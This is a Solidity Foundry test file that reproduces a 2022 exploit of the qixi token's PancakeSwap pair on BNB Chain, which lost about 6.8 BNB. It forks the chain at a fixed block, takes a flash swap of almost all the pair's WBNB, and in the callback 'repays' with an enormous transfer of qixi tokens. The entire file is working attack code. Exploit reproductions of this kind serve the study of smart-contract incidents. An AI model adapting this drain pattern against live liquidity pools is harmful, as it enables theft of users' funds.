pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~6.8 BNB
// TX : https://app.blocksec.com/explorer/tx/bsc/0x16be4fe1c8fcab578fcb999cbc40885ba0d4ba9f3782a67bd215fb56dc579062
// Attacker : https://bscscan.com/address/0x2723e1f6a9a3cd003fd395cc46882e4573cb249f
// Attack Contract : https://bscscan.com/address/0xb7b0fe129fefa222efd4eb1f6bef9de339339bbb
// GUY : https://x.com/8olidity/status/1555366421693345792

contract Exploit is Test{
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakePair Pair = IPancakePair(0x88fF4f62A75733C0f5afe58672121568a680DE84);
    IERC20 qixi = IERC20(0x65F11B2de17c4af7A8f70858D6CcB63AAC215697);

    function setUp() external {
        cheats.createSelectFork("bsc", 20120884);
    }

       function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WBNB before exploit", WBNB.balanceOf(address(this)), 18);
        Pair.swap(0, WBNB.balanceOf(address(Pair)) - 1e7, address(this), bytes("0x123"));
        emit log_named_decimal_uint("[End] Attacker WBNB after exploit", WBNB.balanceOf(address(this)), 18);
   

    }
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data)external{
        qixi.transfer(address(Pair), 999999999999999e18);
    }
}
